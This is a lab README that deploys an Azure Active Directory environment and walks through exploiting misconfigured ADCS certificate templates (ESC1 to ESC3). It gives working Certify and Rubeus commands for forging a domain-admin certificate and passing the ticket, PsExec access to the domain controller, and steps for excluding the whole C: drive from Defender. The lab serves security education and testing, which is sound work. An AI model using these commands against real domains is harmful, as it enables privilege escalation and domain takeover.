## Table of Contents

- [Introduction](#introduction)
- [Before you begin](#beforeyoubegin)
- [Prereqs](#Prereqs)
- [Instructions](#Instructions)


## Introduction

This lab is intended to teach anyone how to exploit some of the [Certified PreOwned](https://posts.specterops.io/certified-pre-owned-d95910965cd2?gi=528e57c97271) findings for Active Directory Certificate Services (ADCS) misconfigurations.  This is $\textcolor{orange}{\textsf{not meant as a full guide on exploiting every single possible scenario}}$ but is meant more as a starter guide on how an attacker might abuse some basic misconfigurations within common ADCS deployments.

For more information on all of the persistence mechanisms, attacks, defense tatics by the SpecterOps team, please read their whitepaper here - [Whitepaper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf).

Below is a basic architecture diagram of what we're setting up today infrastructure-wise.  As you can see we'll be $\textcolor{orange}{\textsf{utilizing the Azure Bastion to RDP into the machines}}$ in the cpowl_subnet, through the cpowl_nsg, to run our mangaement operations.  Then we utilize the $\textcolor{orange}{\textsf{user machine to run our exploits from}}$.  Even though certificate templates are AD objects and configured technically in AD, it's easier to represent exploiting them on an ADCS server since realistically sysadmins are going to configure them on an ADCS server.

```mermaid
graph TD;
  subgraph cpowl_rg
  subgraph cpowl_VNET
    subgraph Bastion_subnet
      H[Azure Bastion]
      style H fill:#800080,stroke:#FFF,stroke-width:2px;
    end
    subgraph cpowl_subnet
      subgraph cpowl_nsg
        subgraph dc
          A[dc_vm];
        end
        subgraph adcs
          C[adcs_vm];
        end
        subgraph user
          E[user_vm];
        end
      end
      
      style A fill:#2196F3,stroke:#FFF,stroke-width:2px;
      style C fill:#2196F3,stroke:#FFF,stroke-width:2px;
      style E fill:#2196F3,stroke:#FFF,stroke-width:2px;

      H-->|RDP 3389|cpowl_nsg
      E -->|#1 Exploit Template|C
      E -->|#2 Escalate to Domain Admin|A
      end
    end
  end

```
\
$\textcolor{red}{\textsf{**Legal disclaimer:**}}$ Please do NOT utilize these techniques against any businesses/entities/etc.  I do not take ownership for you running these commands or labs in anyway.  This is for educational purposes and should not be used in any way to harm anything or anyone.$\textcolor{red}{\textsf{**Legal disclaimer:**}}$

## Before you begin

Before you begin this lab, $\textcolor{orange}{\textsf{ensure that you have adequate time allotted to allow the Azure resources to deploy}}$ but also to run the setup commands necessary to lay the groundwork for this lab.  Please understand that the Azure resources will likely take anywhere from $\textcolor{orange}{\textsf{10-15 minutes to fully deploy}}$.  One issue in particular is the deployment time of the Azure Bastion.  In my test deployments the Bastion alone would take 9 minutes to deploy.  Additionally, I always try and $\textcolor{orange}{\textsf{allow additional time to allow the extensions to run}}$ in the VMs.  Patience is key oftentimes with Azure and it is common theme with getting this lab setup and configured.

Also, keep an eye out for the 3 VMs deployed and an Azure Bastion with a public IP address; $\textcolor{orange}{\textsf{this lab will run up costs}}$.  You can choose lower specs on the virtual machines but if you're waiting 10-15 minutes for a lab to deploy, you probably don't want to wait more time while the windows machines process what you're asking them to do.  Ensure that if you plan on playing around with this lab for a few weeks to de-provision your Azure bastion and public IP address when you leave it.  $\textcolor{orange}{\textsf{Be sure to also fully STOP your virtual machines in the portal (or CLI) to fully de-allocate the resources}}$  and save on cost.  

As Microsoft releases patches to make these escalations more difficult you may see some of these escalations break.  SpecterOps released a blog post about how this happened for some of the escalations (https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d).  If you see that any of the escalations have broken, please submit an issue on the repo and let me know!

## Prereqs

I've included a few of the prerequisites to make your life easier but you will need to $\textcolor{orange}{\textsf{provide the first 4 items for this lab to deploy properly}}$.  I've created an example .tfvars file for you to simply fill in your values.  Keep in mind this is a poor practice for non-production or production workloads.  $\textcolor{orange}{\textsf{Do NOT utilize this method of authentication for non-production or production workloads}}$.

* Entra ID Application Registration (app_id and sp_secret)
* Your subscription ID
* Your Tenant ID
* Passwords and usernames (included) for the virtual machines
* (Included) Predefined domain name for the test domain
* Powershell experience
* Basic understanding of Active Directory Certificate Services (ADCS)

## Instructions

NOTE: Unless otherwise stated, when we say "login" in this lab we mean login through the bastion.

#### Step 1: Insert your sample passwords and various application registration information into the secrets.tfvars file
Since this is a lab and not real, I'd recommend setting up a shorter and easier to remember password given you'll have to enter in the password of the admin user on the USERVM multiple times due to UAC...
```terraform
##########################
#####Secrets for Auth#####
##########################
sp_secret = "Your application registration secret"
tenant_id = "Your tenant id"
app_id    = "Your app id"

# No Policies Sub
subscription_id               = "Your subscription id"

#############################
#####Secrets for Servers#####
#############################
dc_pass                       = "Random password"
adcs_pass                     = "Random password"
user_pass                     = "Random password"
user_admin                    = "useradmin"
dc_admin                      = "dcadmin"
adcs_admin                    = "adcsadmin"
Domain_DNSName                = "testdomain.local"
netbios_name                  = "TESTDOMAIN"
SafeModeAdministratorPassword = "Random password"
```

#### Step 2: Run the following terraform commands
Ensure that you have the proper app_id, sp_secret, tenant_id, subscription_id for this to deploy properly.  
```terraform
terraform init
terraform plan -var-file="secret.tfvars"
terrafrom apply -var-file="secret.tfvars"
```

#### Step 3: Wait for the deployment to finish (could take 15+ mins)
![My Image](waiting.jpg)

#### Step 4: Begin the setup of the domain / machines / configurations
First you'll need to setup the necessary users and groups.  This powershell script is stored under the C:\Users folder.  For some reason when bootstrapping a virtual machine in Azure, the initial bootup sequence cannot access a user path so we have to store it in just the Users directory.

* Note your first login of the DCVM machine may take 1-2 minutes due to the domain setting itself up
* Login to your DCVM machine with your user credentials you setup for the DCVM (i.e. the dcadmin username and password you setup in your secret.tfvars file)
* Retrieve the domainConfig.ps1 script from the C:\Users folder on the virtual machine and move it to your desktop for easy running of the commands. 
* Next open up a Powershell ISE window and open up the "UserAndGroupAndKerberos.ps1" file

Personally, $\textcolor{orange}{\textsf{I like to highlight each statement and run it with the "run selected code" button in ISE}}$ (it is right next to the play button).  In the event that something does go wrong, it will help you identify which exact statement had the error.

You're more than welcome to simply press the play button on this script $\textcolor{orange}{\textsf{(once you remove the newline characters)}}$ the Azure VM Extension adds for the 2nd and 3rd statements.  Once all the commands in this script have run, you're welcome to move onto the next step! 

* NOTE: You'll have to remove the new line characters for both the comments on lines 7 and 10 and the commands on lines 8 and 11

```powershell
# Create a test user
$securePassword = ConvertTo-SecureString -String "@#*(dfjdshfjkaEFDSAF)" -AsPlainText -Force

# For some reason when porting this code to another file it adds a newline, please remove the newline and run the command
New-ADUser -Name "TestUser" -SamAccountName "TestUser" -UserPrincipalName "TestUser@testdomain.local" -GivenName "Test" -Surname "User" -Enabled $true -PasswordNeverExpires $true -AccountPassword $securePassword

# For some reason when porting this code to another file it adds a newline, please remove the newline and run the command
New-ADUser -Name "adcsuser" -SamAccountName "adcsuser" -UserPrincipalName "adcsuser@testdomain.local" -GivenName "adcs" -Surname "user" -Enabled $true -PasswordNeverExpires $true -AccountPassword $securePassword

# Create a test group
New-ADGroup -Name "TestGroup" -SamAccountName "TestGroup" -GroupScope Global -GroupCategory Security

# Add the test user to the test group
Add-ADGroupMember -Identity "TestGroup" -Members "TestUser"

# Add the test user to the test group
Add-ADGroupMember -Identity "Domain Admins" -Members "adcsuser"

# Configure Kerberos authentication
$domainDns = (Get-ADDomain).DNSRoot
Set-ADDomainMode -Identity $domainDns -DomainMode Windows2016Domain

# Restart the server to apply changes
Restart-Computer -Force
```

#### Step 5: Setup the ADCS server
Once your DCVM has been fully setup, we'll need to configure our ADCS server.  The first step we'll need to do is join the machine to do the domain to ensure when we configure the Certificate Authority it gets associated to the domain (Enterprise CA) and not as a Standalone CA.

* Login to your ADCSVM machine with your user credentials you setup for the ADCSVM (i.e. the adcsadmin username and password you setup in your secret.tfvars file)
* Copy the adcs_configuration.ps1 script from the C:\Users folder on the virtual machine and move it to your desktop for easy running of the commands. Next open up a Powershell ISE window with the "adcs_config.ps1" file.  You'll want to leave it in location for when you login with a domain admin next.

$\textcolor{orange}{\textsf{The first statement in the powershell script may need to be edited based upon your DCVM's IP address.}}$  Check within the Azure portal, CLI, command prompt on the DCVM, or some other way to identify the IP address of your DCVM.  Ensure it is filled out appropriately and then ONLY run this block of powershell code as your machine will restart and not run the next code block.

$\textcolor{orange}{\textsf{NOTE:}}$ For the powershell code about joining your machine to a domain you'll need to enter in the dcadmin creds that you created on your DCVM.  Only a domain admin in this situation can add computers to the domain.  Also, ensure you're referencing the domain for this step when you type in the dcadmin name (i.e. testdomain.local\dcadmin)

$\textcolor{orange}{\textsf{Run this code line by line as it will break if you attempt to run all the steps at once}}$

Also I would recommend once the machine restarts not attempting to "Reconnect" through the bastion and starting a fresh session.
```powershell
##### Join machine to the domain#####
    
# Configure DNS to use the DC as DNS
# You may need to configure this setting differently if your IP of your DC is different
Netsh interface ipv4 set dns name=Ethernet static 10.0.1.6 primary

# Define the domain and get creds
$domain = "testdomain.local"
$credential = Get-Credential

# Use the -Credential parameter to provide domain credentials
Add-Computer -DomainName $domain -Credential $credential -Restart -Force
##### Join machine to the domain#####
#----------------------------------#
```

* Once the machine has rebooted, you'll need to login with DIFFERENT credentials so you can configure the CA.
* This time you'll login with the adcsuser and the password defined in the powershell script for the domainConfig.ps1 under $securePassword
* To login with domain credentials you'll need to provide the UPN of the adcs user

What that will look like is below:
```yml
Username: dcadmin@testdomain.local
Password: password in the secrets.tfvars
```

* Once you've logged in with your domain credentials, you'll want to again find the powershell script in the C:\Users folder and copy it to the dcadmins's desktop for ease.

* Now we can run the CA configuration steps.  Once again, the server will restart so you'll have to login once again after the machine has restarted
```powershell
#####Install ADCS#####
#--------------------#
Install-WindowsFeature Adcs-Cert-Authority -IncludeManagementTools
    
$params = @{
CAType              = "EnterpriseRootCa"
CryptoProviderName  = "RSA#Microsoft Software Key Storage Provider"
CADistinguishedNameSuffix = "DC=testdomain,DC=local"
CACommonName        = "testca.testdomain.local"
KeyLength           = 2048
HashAlgorithmName   = "SHA256"
ValidityPeriod      = "Years"
ValidityPeriodUnits = 3
}
Install-AdcsCertificationAuthority @params -Credential $credential

# Output success message
Write-Host "Enterprise Root CA installation completed successfully."

# Restart the server to apply changes
Restart-Computer -Force

#####Install ADCS#####
#--------------------#
```

* Login with your domain credentials of the dcadmin (see above for formatting) to ensure everything got setup correctly.

For these escalations to work we must ensure that the CA certificate is stored within the NTAuth and NTAuth CA stores.  With the way we setup our domain we shouldn't need to perform this step, but to ensure that we don't run into any future issues it is advised that we run these commands.

1. First we'll need to export the CA certificate by opening up the "Certification Authority" app
2. Right click on the CA name and click "Properties"
3. Click the "View Certificate" button
4. Navigate to the "Details" tab
5. Click the "Copy to File" button
6. Click "Next"
7. Click "Base 64 encoded (.cer)"
8. Click "Next"
9. Navigate to a directory where you want to store the certificate and save it there

Now we'll run the commands to publish it into the appropriate AD container.

```cmd
certutil -dspublish -f ca_name.cer NTAuthCA
```
 In certain scenarios, such as AD replication latency or when the “Do not enroll certificates automatically” policy setting is enabled, the registry is not updated. In these scenarios, you can run the following command manually to insert the certificate into the registry location: 
```cmd
certutil -enterprise -addstore NTAuth issuing_ca_name.cer
```

Now we will setup an insecure certificate template so we can exploit it in an attack.  Unfortunately, due to ADCS being such old technology, I was unable to find a simple way (I spent many hours searching) to automate the creation of an insecure certificate template without having to develop a piece of software that calls various APIs on the windows system.  Therefore, we'll be configuring it the manual way!  One good thing for us is that it will solidify the fact that these configurations are insecure.  Work will continue onward in one of the next steps.

#### Step 6: Request the appropriate certificates for our domain controller
This is a crucial step for allowing us to complete these exploits.  You'll need to enroll your DC in the appropriate certificates for the domain controller.

To do this we'll need to follow these steps:
1. Login to your DCVM machine with your user credentials you setup for the DCVM (i.e. the dcadmin username and password you setup in your secret.tfvars file)
2. Click the windows button and open "Run"
3. Type in "certlm.msc" and hit enter
4. Click into the "Personal" folder and then the "Certificates" folder
5. Right click in the white space and hit "All Tasks" -> "Request new Certificate"
6. Click "Next" and "Next"
7. Once you get to the "Request Certificates" page you'll want to select the following certificate templates:
- Domain Controller
- Domain Controller Authentication
- Kerberos Authentication
8. Click "Enroll"

Here is an example of what it'll look like:

![My Image](DCcerts.png)

Now we've retrieved the appropriate certificates for our exploits!  Note: if you do not do this step you'll likely run into the **"KDC_ERR_PADATA_TYPE_NOSUPP"** error.

#### Step 7: Configure insecure certificate template
Keeping our session still logged into the ADCSVM with our dcadmin, we'll want to follow the following steps:

1. Click on the windows button in the lower left hand corner of your screen
2. Type in "Certification Authority" and click on the icon
3. Find the folder for "Certificate Templates"
4. Right click on the "Certificate Templates" folder and click on "Manage"
5. Find the "User" Certificate template and right click on it
6. Right click and then select "Duplicate Template"
7. In the newly opened window click into the "General" tab and rename the template to "UserInsecureESC1"
8. Next we'll want to ensure that we change the enrollment options under the "Subject Name" tab
9. Change it to "Supplied in the request" rather than "Built from Active Directory"
10. Then you'll want to go to the "Security" tab and click "Add"
11. You'll want to add the permissions "Read" and "Enroll" permissions on the "Authenticated Users" group
12. Click "Apply" and then "OK"
13. We're not done yet.  Now we need to publish the template so go back to the main certificate authority console where you originally right clicked on "Certificate Templates"
14. Right click on the "Certificate Templates" folder again click "New" -> "Certificate Template to issue"
15. Find and click on the certificate template that we just created "UserInsecureESC1" and click "OK"
16. You may need to wait 60 seconds or so for this template to publish out to AD but since this is a tiny one DC domain, it should publish very fast

#### Step 8: Configure your User Virtual Machine
Now that we have our infrastructure setup and configured, let's configure our attacking machine.  This step will take a bit more manual configuration and install time given we have to build our attacking tools from source on our attacking machine, but it is worth it because once you see how easy ESC1 is with these tools, you'll be amazed how easy it is to get domain admin.

1. Login to your USERVM machine with your user credentials you setup for the USERVM (i.e. the useradmin username and password you setup in your secret.tfvars file)
2. Copy the userVMConfig.ps1 script from the C:\Users folder on the virtual machine and move it to your desktop for easy running of the commands. Next open up a Powershell ISE window. You'll want to leave it in location for when you login with a domain user next.
3. The first statement in the powershell script may need to be edited based upon your DCVM's IP address.  Check within the Azure portal, CLI, command prompt on the DCVM, or some other way to identify the IP address of your DCVM.  Ensure it is filled out appropriately and then ONLY run this block of powershell code as your machine will restart and not run the next code block.

$\textcolor{orange}{\textsf{Run this code line by line as it will break if you attempt to run all the steps at once}}$

Also I would recommend once the machine restarts not attempting to "Reconnect" through the bastion and starting a fresh session.
```powershell
#######################
#### Configure DNS ####
#######################

# Configure DNS to use the DC as DNS
# You may need to configure this setting differently if your IP of your DC is different
Netsh interface ipv4 set dns name=Ethernet static 10.0.1.6 primary

#######################
#### Configure DNS ####
#######################
    
######################################
##### Join machine to the domain #####
######################################

$domain = "testdomain.local"
$credential = Get-Credential

# Use the -Credential parameter to provide domain credentials
Add-Computer -DomainName $domain -Credential $credential -Restart -Force

######################################
##### Join machine to the domain #####
######################################
```
4. After the machine restarts you'll want to re-login with your local administrator creds for this next step.  Run the below powershell command.
```powershell
    # Add user to Remote Desktop Users group
    # This needs to be run as a domain admin
    Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'testdomain.local\TestUser'
```
5. Next we'll want to close out of our session as the useradmin and re-login with our TestUser.  You can login with the credentials below.  
```yml
Username: TestUser@testdomain.local
Password: @#*(dfjdshfjkaEFDSAF)
```
6. Once logged in, go and grab that script from C:\Users again and copy it to your desktop for easier use.  Again, open up a powershell ISE window. Now we need to download some software.  Run the following two commands to download the software you need.

$\textcolor{orange}{\textsf{NOTE: To move the file you'll need to use admin creds}}$.  Enter the useradmin creds as stated below.
```yml
Username: .\useradmin
Password: password you set in secrets.tfvars
```
Now we can move to installing the software.  For some reason when the VM extension adds these scripts new line characters get added so be aware of that.  Ensure that you run the commands as seen on this README.md.  You'll likely need to remove a comment and make the command one line again.
```powershell
# Install git
curl -o gitinstall.exe https://github.com/git-for-windows/git/releases/download/v2.43.0.windows.1/Git-2.43.0-64-bit.exe
    
# Install Visual Studio Community
curl -o visualstudioinstall.exe https://aka.ms/vs/17/release/vs_community.exe
```
7. Install git by running the .exe file and you should be able to utilize all of the default out-of-the-box (OOTB) configurations.

8. Install Visual Studio Community edition, NOTE this will take some time to install as you'll have to download approximately 10GB+ of necessary files to be able to build Rubeus (.NET dependencies).  So when it asks you what software packages you want to build (workloads) ensure that you select the .NET workload.  Now go take a break and grab a snack / coffee whilst you wait for the install to complete.  I believe you'll need to restart the machine after it installs as well.

9. This next step is to allow us to download and install Rubeus.  Windows Defender classifies Rubeus as a virus/malware so let's add a Defender exception to not annoy us.  What we're going to do is add an exception on the entire C: drive to make our lives easier (DO NOT DO THIS OUTSIDE OF A SANDBOX EVER)

* Open up "Settings"
* Go to "Settings and Security"
* Go to * "Windows Security"
* Click on "Open Windows Security"
* Click on "Virus & threat protection"
* Under "Virus & threat protection settings" click on "Manage Settings"
* Scroll down to "Exclusion" and click on "Add or remove exclusions"
* Click on "Add an exclusion" and select "folder"
* Select the "C:\" drive
* Type in "Exceptions"
* Find "Folder Exceptions"
* Add the C: drive

![My Image](exclusion.png)

10. Clone Rubeus and Certify utilizing the git command from a command prompt
```powershell
# This should be run from a command prompt
git clone https://github.com/GhostPack/Rubeus.git

# This should be run from a command prompt
git clone https://github.com/GhostPack/Certify.git
```

11. Now we can build Rubeus and Ceritfy into a .exe!  Open up Visual Studio Community edition and click on "File" and then "Open File".  Navigate to the Rubeus.sln file and "open" it.  When you receive the notice about updating the framework, simply click "Continue"

12. Click the "Build" tab and then "Build Solution".  In the command window at the bottom of your screen you should see a success (no failures) and now you should have a .exe for Rubeus!

13. Repeat the same open and build steps for Certify

NOTE: Your .exe files will be stored in the ^software^/bin/Debug/ folder

#### Step 9: Exploit an insecure certificate template (ESC 1)

Now that we have all of our software dependencies installed, our infrastructure setup, our insecure certificate template configured, let's go exploit it.  What we're going to do here is first obtain a certificate from the CA that contains a SAN (Subject Alternative Name) of the adcsuser (domain admin), and then we'll pass it through Rubeus to get a TGT and then we will pass that TGT to the KDC to get a domain admin session!

$\textcolor{orange}{\textsf{NOTE:}}$ SpecterOps published a tool for getting certificates easily using their "Certify" tool.  We will be utilizing that tool to create our certificate due to the fact that Microsoft released a patch (KB5014754) that requires us to inject the SID of the user we're attempting to escalate to.  This is due to the szOID_NTDS_CA_SECURITY_EXT extension being set and required for Kerberos.  

Before we can request the certificate we'll first need to get the SID of the user that we're attempting to escalate to.  To do this we can easily run the wmic command to get a list.  This will provide us a list of SIDs and we'll want to copy the SID of the "adcsuser".

```cmd
wmic useraccount get name,sid
```

![My Image](wmic.png)

Once we've gotten the SID of the adcsuser, let's inject it into the certificate request with Certify.  First you'll need to navigate to where the .exe is stored for Certify.  In my test it resided in C:\Users\TestUser\Certify\Certify\bin\Debug.  Then you'll run the below command:

```cmd
Certify.exe request /ca:ADCSVM.testdomain.local\testca.testdomain.local /template:UserInsecureESC1 /altname:adcsuser /sidextension:*adcsusersid*

Example command with SID:
Certify.exe request /ca:ADCSVM.testdomain.local\testca.testdomain.local /template:UserInsecureESC1 /altname:adcsuser /sidextension:S-1-5-21-117661645-4056488094-39039750-1104
```

![My Image](certify.png)

You should now receive a certificate and private key from the CA!  You'll need to follow these steps to get it into a format so we can send it to the KDC.

1. Copy the entire private key and certificate (from the -----BEGIN RSA PRIVATE KEY----- all the way to the -----END CERTIFICATE-----, inclusive of those "headers" and "footers")
2. Utilizing your command prompt open up notepad session in your Certify folder(do not try and create a text document and paste in the contents as it will append the .txt and mess up the file).

```cmd
notepad.exe cert.pem
```
![My Image](notepad.png)

3. Paste in the private key and certificate
4. Open up git bash (because it has openssl pre-installed) and navigate to your Certify folder where you've just created the cert.pem file
5. Run the following openssl command to convert the cert into a .pfx file
6. Note you won't see any output except for the file being created in the folder

```cmd
openssl pkcs12 -password pass:Password123! -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
![My Image](bash.png)

FINALLY, we're ready to execute the attack!  First copy the cert.pfx to your Rubeus folder where the .exe is stored.

1. Run the below command.  This command will utilize the certificate we just created, and it will request a TGT under the username adcsuser (which is a domain admin) then the ticket generated will be automatically passed so you then you've escalated your privileges.  Open up a command prompt and first navigate to where the .exe for Rubeus is stored!
```powershell
# Run the Rubeus command to get the .kirbi
Rubeus.exe asktgt /user:adcsuser /certificate:cert.pfx /password:Password123! /ptt
```
![My Image](Rub.png)

$\textcolor{orange}{\textsf{The /ptt passes the ticket so we don't have to run an extra step}}$

2. Utilizing your new privileges we can now run a simple command to test our newly found privileges.  In this command we utilize the directory command to list the c$ directory on the DC.  NOTE - There is a "gotcha" here if you attempt to view the directory utilizing the IP address.  I spent HOURS attempting to determine what access I was missing but the problem was simply utilizing the FQDN of the DC.  Shoutout to **t0pazg3m** for this article [PTT Attack](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a) that helped me determine that issue!
```cmd
dir \\DCVM.testdomain.local\c$
```

![My Image](dir.png)

3. For fun you can also download psexec and remotely spin up a command prompt on the machine.
```cmd
PsExec.exe \\DCVM.testdomain.local cmd.exe
```

![My Image](Psexec.png)

The reason this attack works is because we have configured a vulnerable certificate template that allows the following (wording taken from the Certified PreOwned paper):
1. The Enterprise CA grants low-privileged users enrollment rights. 
2. Manager approval is disabled.
3. No authorized signatures are required.
4. An overly permissive certificate template security descriptor grants certificate
enrollment rights to low-privileged users.

It also has the following configurations to allow this attack to function:
1. Client authentication EKU (enables authentication)
2. Allows SAN (Subject Alternative Name) in the CSR (AKA "Supply in the request")

An important mention from the SpecterOps team is "The WebServer template has the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag enabled and then if IT administrators add the “Client Authentication” or “Smart Card Logon” EKUs, the vulnerable scenario occurs without a warning from the GUI."


#### Step 10: Exploit an insecure certificate template (ESC 2)

Now that you've exploited ESC 1, let's take a look at ESC 2!  We have to configure another certificate template here so we can exploit it.

What we're going to be accomplishing with this exploit is obtaining a certificate that can escalate to a different user (only if it's a V1 template).  This escalation utilizes the over-permissive "Any Purpose" EKU

1. Click on the windows button in the lower left hand corner of your screen
2. Type in Certification Authority and click on the icon
3. Find the folder for "Certificate Templates"
4. Right click on the "Certificate Templates" folder and click on "Manage"
5. Find the "User" Certificate template and right click on it
6. Click "Duplicate"
7. In the newly opened window click into the "General" tab and rename the template to "UserInsecureESC2"
8. Then you'll want to go to the "Extensions" tab and go to "Application Policies" and remove all of the EKUs and add only the "AnyPurpose" EKU, then click "OK"
9. Navigate to the "Subject Name" tab and remove the "Include e-mail name in subject name" and "E-mail name" checkboxes
10. Click "Apply" and then "OK"
11. We're not done yet.  Now we need to publish the template so go back to the main certificate authority console where you originally right clicked on "Certificate Templates"
12. Right click on the "Certificate Templates" folder again click "New" -> "Certificate Template to issue"
13. Find and click on the certificate template that we just created "UserInsecureESC2" and click "OK"
14. You may need to wait 60 seconds or so for this template to publish out to AD but since this is a tiny one DC domain, it should publish very fast.

Now we need to enroll in this certificate.  Open up a session with your TestUser user in the USERVM.  Then run the following commands:

1. Click on the windows button and type in "Run", hit enter to open up the run prompt
2. Type in "certmgr.msc" and hit enter
3. Navigate to the personal folder under the user's certificate store and then click into "Certificates"
4. Right click in the white space and click "All Tasks" -> "Request new certificate"
5. Click "Next" and "Next"
6. On the certificate template selector, click on the UserInsecureESC2 template and click "Enroll"
7. Congrats!  Now we have a certificate that will allow us to do anything a certificate can possibly do!

Now let's export our certificate and move it to where we'll run Certify.exe again

1. Right click on the certificate just issued and click "All Tasks" --> "Export"
2. Click "Next"
3. Check the "Yes, export the private key"
4. Leave all the defaults on the Export file format page
5. Set a password such as Password123!
6. Change the encryption to "AES256-SHA256" and click "Next"
7. Choose the file location where the Certify.exe is stored and name the file mycert (the extension will be automatically added)
8. Click "Export"

Run the following command to use Certify to request a certificate to the CA on behalf of the adcsuser
```cmd
Certify.exe request /ca:ADCSVM.testdomain.local\testca.testdomain.local /enrollcert:mycert.pfx /enrollcertpw:Password123! /template:User /onbehalfof:testdomain\adcsuser
```
![My Image](anyp.png)

Congrats!  Now you can follow the previous steps as in ESC1 to request a TGT under the guise of the adcsuser!

1. Now that we have the certificate on behalf of the other user, we can request a tgt on behalf of the adcsuser.  Make sure to copy the pfx into where you compiled your Rubeus.exe.
```cmd
Rubeus.exe asktgt /user:adcsuser /certificate:mycert.pfx /password:Password123! /ptt
```
2. Now that we've gotten a new tgt, we can run the previous command from ESC1 to browse in the DC's C drive.
```cmd
dir \\DCVM.testdomain.local\c$
```

#### Step 11: Exploit an insecure certificate template (ESC 3)

This escalation relies on misconfigured enrollment agent templates.  This scenario is similar to that of the ESC2.  Long story short enrollment agent templates allow you to enroll for a certificate on-behalf-of another user.  The EKU that this escalation relies on is called the "certificate request agent".  Let's go ahead and configure a certificate template to have that EKU.

Setup the first misconfigured template:
1. Click on the windows button in the lower left hand corner of your screen
2. Type in Certification Authority and click on the icon
3. Find the folder for "Certificate Templates"
4. Right click on the "Certificate Templates" folder and click on "Manage"
5. Find the "User" Certificate template and right click on it
6. Click "Duplicate"
7. In the newly opened window click into the "General" tab and rename the template to "UserInsecureESC3"
8. Then you'll want to go to the "Extensions" tab and go to "Application Policies" and remove all of the EKUs and add only the "Certificate Request Agent" EKU, then click "OK"
9. Navigate to the "Subject Name" tab and remove the "Include e-mail name in subject name" and "E-mail name" checkboxes
10. Click "Apply" and then "OK"
11. We're not done yet.  Now we need to publish the template so go back to the main certificate authority console where you originally right clicked on "Certificate Templates"
12. Right click on the "Certificate Templates" folder again click "New" -> "Certificate Template to issue"
13. Find and click on the certificate template that we just created "UserInsecureESC3" and click "OK"
14. You may need to wait 60 seconds or so for this template to publish out to AD but since this is a tiny one DC domain, it should publish very fast.

Now we need to enroll in this certificate.  Open up a session with your TestUser user in the USERVM.  Then run the following commands:

1. Click on the windows button and type in "Run", hit enter to open up the run prompt
2. Type in "certmgr.msc" and hit enter
3. Navigate to the personal folder under the user's certificate store and then click into "Certificates"
4. Right click in the white space and click "All Tasks" -> "Request new certificate"
5. Click "Next" and "Next"
6. On the certificate template selector, click on the UserInsecureESC3 template and click "Enroll"
7. Congrats!  Now we have a certificate that will allow us to do anything a certificate can possibly do!

Now let's export our certificate and move it to where we'll run Certify.exe again

1. Right click on the certificate just issued and click "All Tasks" --> "Export"
2. Click "Next"
3. Check the "Yes, export the private key"
4. Leave all the defaults on the Export file format page
5. Set a password such as Password123!
6. Change the encryption to "AES256-SHA256" and click "Next"
7. Choose the file location where the Certify.exe is stored and name the file mycert (the extension will be automatically added)
8. Click "Export"

Given the User template already exists we can utilize that as the secondary vulnerable template here.  A key note about this escalation is that it requires that "The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement requiring the Certificate Request Agent EKU."

Now that we've configured our misconfigured template, we can go ahead and execute the exploit.

```cmd
Certify.exe request /ca:ADCSVM.testdomain.local\testca.testdomain.local /enrollcert:mycert.pfx /enrollcertpw:Password123! /template:User /onbehalfof:testdomain\adcsuser
```

You should now receive a certificate and private key from the CA!  You'll need to follow these steps to get it into a format so we can send it to the KDC.

1. Copy the entire private key and certificate (from the -----BEGIN RSA PRIVATE KEY----- all the way to the -----END CERTIFICATE-----, inclusive of those "headers" and "footers")
2. Utilizing your command prompt open up notepad session in your Certify folder(do not try and create a text document and paste in the contents as it will append the .txt and mess up the file).

```cmd
notepad.exe cert.pem
```
![My Image](notepad.png)

3. Paste in the private key and certificate
4. Open up git bash (because it has openssl pre-installed) and navigate to your Certify folder where you've just created the cert.pem file
5. Run the following openssl command to convert the cert into a .pfx file
6. Note you won't see any output except for the file being created in the folder

```cmd
openssl pkcs12 -password pass:Password123! -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

7. Now that we have the certificate on behalf of the other user, we can request a tgt on behalf of the adcsuser.  Make sure to copy the pfx into where you compiled your Rubeus.exe.
```cmd
Rubeus.exe asktgt /user:TESTDOMAIN\adcsuser /certificate:cert.pfx /password:Password123! /ptt
```
8. Now that we've gotten a new tgt, we can run the previous command from ESC1 to browse in the DC's C drive.
```cmd
dir \\DCVM.testdomain.local\c$
```

#### Step 12: Exploit an insecure certificate template access control (ESC 4)

$\textcolor{orange}{\textsf{THESE ESC INSTRUCTIONS ARE UNDER CONSTRUCTION}}$

https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4

---

$\textcolor{orange}{\textsf{Skipping ESC 5 as it less applicable to this lab}}$

---

#### Step 13: Exploit an insecure certificate template access control (ESC 6)
While I was initially going to cover this escalation, Microsoft released a patch that broke a majority of ESC6.  Therefore, we won't be covering this as it's more of a niche privilege escalation.  See the screenshot below on when it is exploitable.

![My Image](exploitable.png)

#### Step 14: Exploit an insecure certificate template access control (ESC 7)
While I was initially going to cover this escalation, Microsoft released a patch that broke a majority of ESC7.  There is another way to abuse ESC7 covered [here](https://twitter.com/ly4k_/status/1590413940105703425). This is on my to-do list to add in here!

#### Step 15: Tear down your sources
Now that you've completed each escalation on here, tested only a few escalations, or just played around in the environment, it's time to tear down the resources.  Again we run into "speed" of Azure and have to now tear down our resources.  Be prepared to wait another 10-15 minutes for the entire build to be torn down.  Mainly you'll be waiting on the Azure Bastion to tear itself down.

```
terraform destroy -var-file="secret.tfvars"
```

**Improvements:**
- Go through and complete the documentation for ESC4
- Document how "Passthecert" module can still lead to escalations even if you remove the CA from the NTAuth store https://nitter.ktachibana.party/techspence/status/1674047137460498432#m
- Document new attack techniques (https://heartburn.dev/exploiting-active-directory-certificate-services-esc11-walkthrough/)
- Add a managed identity to the adcs VM with VM reader to allow pulling the IP so in the powershell script you don't have to manually enter in the IP address
- Identify a way to auto-configure the domain without lab-users run the domain config commands